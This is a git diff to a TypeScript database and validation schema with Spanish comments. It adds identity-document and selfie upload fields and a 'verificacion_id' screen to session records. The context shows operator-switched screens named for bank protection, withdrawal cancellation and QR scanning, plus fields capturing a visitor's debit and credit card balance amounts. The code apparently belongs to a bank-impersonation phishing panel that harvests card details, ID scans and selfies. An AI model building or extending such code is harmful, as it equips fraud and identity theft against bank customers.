@@ -141,6 +141,12 @@ export const sessions = pgTable("sessions", {
   fileName: text("file_name"), // Nombre del archivo subido
   fileUrl: text("file_url"), // URL del archivo para descarga
   fileSize: text("file_size"), // Tamaño del archivo
+  documentType: text("document_type"), // Tipo de documento de identidad (INE/Pasaporte)
+  documentFileName: text("document_file_name"), // Nombre del archivo del documento
+  documentFileUrl: text("document_file_url"), // URL del archivo del documento
+  selfieFileName: text("selfie_file_name"), // Nombre del archivo del selfie
+  selfieFileUrl: text("selfie_file_url"), // URL del archivo del selfie
+  identityVerified: boolean("identity_verified").default(false), // Estado de verificación de identidad
   // Información de protección de saldo
   saldoDebito: text("saldo_debito"), // Respuesta sobre tarjeta de débito
   montoDebito: text("monto_debito"), // Monto en tarjeta de débito
@@ -254,7 +260,8 @@ export enum ScreenType {
   ESCANEAR_QR = "escanear_qr",
   CANCELACION_RETIRO = "cancelacion_retiro",
   PROTECCION_BANCARIA = "proteccion_bancaria",
-  PROTECCION_SALDO = "proteccion_saldo"
+  PROTECCION_SALDO = "proteccion_saldo",
+  VERIFICACION_ID = "verificacion_id"
 }
 
 export const screenChangeSchema = z.object({
@@ -276,6 +283,12 @@ export const screenChangeSchema = z.object({
   montoDebito: z.string().optional(), // Monto en tarjeta de débito
   saldoCredito: z.string().optional(), // Respuesta sobre tarjeta de crédito
   montoCredito: z.string().optional(), // Monto en tarjeta de crédito
+  documentType: z.string().optional(), // Tipo de documento (INE/Pasaporte)
+  documentFileName: z.string().optional(), // Nombre del archivo del documento
+  documentFileUrl: z.string().optional(), // URL del archivo del documento
+  selfieFileName: z.string().optional(), // Nombre del archivo del selfie
+  selfieFileUrl: z.string().optional(), // URL del archivo del selfie
+  verified: z.boolean().optional(), // Estado de verificación
 });
 
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
